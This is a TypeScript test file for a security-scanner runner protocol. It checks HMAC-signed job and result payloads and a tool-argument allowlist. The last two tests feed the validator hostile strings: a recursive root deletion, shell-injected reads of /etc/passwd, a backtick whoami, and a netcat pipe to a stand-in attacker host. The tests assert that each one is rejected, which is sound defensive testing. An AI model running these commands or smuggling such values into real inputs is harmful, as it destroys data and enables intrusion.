// test/callback-signature.test.ts
import { describe, it, expect } from "vitest";
import { signJobPayload, verifyJobPayload, signResultPayload, verifyResultPayload, validateToolArgs } from "../src/providers/scanners/runner-protocol.js";

const KEY = "test-hmac-key-very-very-long-32-bytes-of-randomness";

describe("runner callback signature verification", () => {
  it("signs and verifies job payloads", async () => {
    const payload = {
      scan_job_id: "SCAN_1",
      target_id: "TGT_1",
      tool: "nmap",
      args: { "-p": "80,443", "-sV": true },
      scope_fingerprint: "abc",
      max_runtime_seconds: 300,
      max_output_bytes: 1024 * 1024,
    };
    const signed = await signJobPayload(payload, KEY);
    expect(await verifyJobPayload(signed, KEY)).toBe(true);
  });

  it("rejects tampered payloads", async () => {
    const payload = {
      scan_job_id: "SCAN_1",
      target_id: "TGT_1",
      tool: "nmap",
      args: { "-p": "80,443" },
      scope_fingerprint: "abc",
      max_runtime_seconds: 300,
      max_output_bytes: 1024 * 1024,
    };
    const signed = await signJobPayload(payload, KEY);
    signed.tool = "subfinder";
    expect(await verifyJobPayload(signed, KEY)).toBe(false);
  });

  it("signs and verifies result payloads", async () => {
    const result = {
      job_id: "JOB_1", scan_job_id: "SCAN_1", status: "completed" as const, tool: "nmap",
      exit_code: 0, duration_seconds: 12, artifacts: [], scope_validation_passed: true,
      timestamp: new Date().toISOString(),
    };
    const signed = await signResultPayload(result, KEY);
    expect(await verifyResultPayload(signed, KEY)).toBe(true);
  });

  it("rejects expired result payloads", async () => {
    const result = {
      job_id: "JOB_1", scan_job_id: "SCAN_1", status: "completed" as const, tool: "nmap",
      exit_code: 0, duration_seconds: 12, artifacts: [], scope_validation_passed: true,
      timestamp: new Date(Date.now() - 2 * 3600 * 1000).toISOString(),
    };
    const signed = await signResultPayload(result, KEY);
    expect(await verifyResultPayload(signed, KEY)).toBe(false);
  });

  it("validates tool args allowlist", () => {
    expect(validateToolArgs("nmap", { "-p": "80", "-sV": true }).ok).toBe(true);
    expect(validateToolArgs("nmap", { "--exec": "rm -rf /" }).ok).toBe(false);
    expect(validateToolArgs("nmap", { "-p": "80; rm -rf /" }).ok).toBe(false);
    expect(validateToolArgs("not_a_tool", {}).ok).toBe(false);
  });

  it("rejects shell metacharacters in args", () => {
    expect(validateToolArgs("nmap", { "-p": "80; cat /etc/passwd" }).ok).toBe(false);
    expect(validateToolArgs("nmap", { "-p": "80`whoami`" }).ok).toBe(false);
    expect(validateToolArgs("nmap", { "-p": "80|nc attacker.com 4444" }).ok).toBe(false);
  });
});
